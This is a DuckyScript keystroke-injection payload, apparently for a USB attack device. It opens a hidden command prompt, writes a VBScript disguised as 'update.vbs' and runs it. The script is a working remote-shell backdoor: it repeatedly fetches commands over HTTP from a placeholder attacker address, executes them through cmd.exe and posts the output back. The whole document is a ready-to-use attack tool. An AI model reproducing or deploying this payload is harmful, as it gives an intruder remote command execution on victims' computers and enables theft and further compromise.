DELAY 3000
GUI r
DELAY 400
STRING cmd /Q /D /T:01 /F:OFF /V:ON /K
ENTER
DELAY 400
STRING copy /Y con update.vbs
ENTER
STRING Option Explicit:On Error Resume Next:Dim X, S, E, B, R:Set S = CreateObject("WScript.Shell")
STRING :B = False:While B <> True:Set X = WScript.CreateObject("MSXML2.ServerXMLHTTP")
STRING :X.Open "GET", "http://<ip_address>:<port>/", false:X.Send:If InStr(X.responseText, "EXIT") Then
ENTER
STRING B = True
ENTER
STRING ElseIf (Len(Trim(X.responseText)) > 0) Then
ENTER
STRING Set E = S.Exec(("C:\Windows\System32\cmd.exe /c " & Trim(X.responseText))):R = ""
STRING :Do Until E.StdOut.AtEndOfStream:R = R & E.StdOut.ReadAll():Loop
STRING :Set X = WScript.CreateObject("MSXML2.ServerXMLHTTP"):X.Open "POST", "http://<ip_address>:<port>/", false
STRING :X.Send(R)
ENTER
STRING End If:Wend
ENTER
CTRL z
ENTER
STRING cscript update.vbs
ENTER
